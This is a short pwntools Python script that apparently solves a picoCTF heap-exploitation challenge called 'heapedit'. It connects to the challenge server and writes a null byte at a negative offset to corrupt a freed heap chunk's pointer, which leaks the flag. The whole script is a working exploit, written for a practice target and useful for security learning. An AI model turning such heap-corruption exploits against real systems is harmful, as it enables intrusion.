#!/usr/bin/env python3

from pwn import *

exe = ELF("./heapedit_patched")
libc = ELF("./libc-chall.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


gdbscript = \
'''
break *main+555
'''


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r, gdbscript)
    else:
        r = remote("mercury.picoctf.net", 10097)

    return r


def main():
    r = conn()

    # p2p heap heap
    # ...
    # 0x1be6088 —▸ 0x1be7890 —▸ 0x1be7800 ◂— 0x0
    # ...

    # NOTE: Offset is -5144 for the pointer to the freed chunk

    r.sendlineafter(b"Address: ", b"-5144")
    r.sendlineafter(b"Value: ", b"\x00")

    flag = r.recvline().decode("ascii")[8:]
    log.success(f"Flag obtained: {flag}")
    # r.interactive("$ ")


if __name__ == "__main__":
    main()
